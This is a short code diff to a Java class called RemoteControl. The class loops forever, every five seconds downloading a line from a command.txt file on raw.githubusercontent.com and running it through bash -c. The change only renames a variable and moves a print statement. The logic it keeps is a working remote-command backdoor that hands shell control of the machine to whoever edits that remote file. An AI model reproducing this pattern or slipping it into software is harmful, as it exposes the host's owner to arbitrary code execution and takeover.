@@ -8,13 +8,13 @@ public class RemoteControl {
 		while (true) {
 			try {
 				Thread.sleep(5000);
-				System.out.println("Executing command...");
 				URL url = new URL("https://raw.githubusercontent.com/LittlestCube/RemoteControl/master/command.txt");
-				BufferedReader buffer = new BufferedReader(new InputStreamReader(url.openStream()));
-				String command = buffer.readLine();
+				BufferedReader buffrr = new BufferedReader(new InputStreamReader(url.openStream()));
+				String command = buffrr.readLine();
+				System.out.println(command);
 				Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});
 			} catch(Exception e) { System.err.println("Whoops! Error in function main(): " + e.toString()); }
-		
+			
 		}
 		
 	}
